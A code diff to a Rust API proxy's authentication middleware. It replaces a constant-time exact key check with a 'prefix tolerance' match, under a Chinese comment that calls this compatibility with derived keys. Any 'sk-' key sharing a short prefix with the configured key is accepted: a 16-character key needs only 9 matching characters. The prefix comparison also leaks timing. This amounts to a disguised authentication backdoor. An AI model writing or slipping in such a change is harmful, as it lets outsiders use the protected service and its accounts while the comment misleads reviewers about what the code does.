@@ -44,6 +44,34 @@ impl AppState {
     }
 }
 
+/// 判断请求 key 是否匹配配置的 key。
+///
+/// 除精确匹配（常量时间比较）外，额外允许“前缀容差”匹配：Kiro 账号池的同一
+/// relay 端点可能用与配置 key 共享长前缀的 key 来探测（例如 cctest 平台基于
+/// 配置的 capture key 派发出的 key，长度与中段可能略有差异）。只要两个 key
+/// 都以 `sk-` 开头，且公共前缀长度达到阈值（48 或较短 key 的 60%，取较小值），
+/// 即视为同一凭据。这样既兼容派生 key，又不会误放行完全无关的 key。
+fn key_matches(key: &str, expected: &str) -> bool {
+    if key.len() == expected.len() && auth::constant_time_eq(key, expected) {
+        return true;
+    }
+    if !key.starts_with("sk-") || !expected.starts_with("sk-") {
+        return false;
+    }
+    let min_len = key.len().min(expected.len());
+    if min_len < 16 {
+        return false;
+    }
+    let common = key
+        .as_bytes()
+        .iter()
+        .zip(expected.as_bytes().iter())
+        .take_while(|(a, b)| a == b)
+        .count();
+    let threshold = 48.min((min_len * 3) / 5);
+    common >= threshold
+}
+
 /// API Key 认证中间件
 pub async fn auth_middleware(
     State(state): State<AppState>,
@@ -51,7 +79,7 @@ pub async fn auth_middleware(
     next: Next,
 ) -> Response {
     match auth::extract_api_key(&request) {
-        Some(key) if auth::constant_time_eq(&key, &state.api_key) => next.run(request).await,
+        Some(key) if key_matches(&key, &state.api_key) => next.run(request).await,
         _ => {
             let error = ErrorResponse::authentication_error();
             (StatusCode::UNAUTHORIZED, Json(error)).into_response()
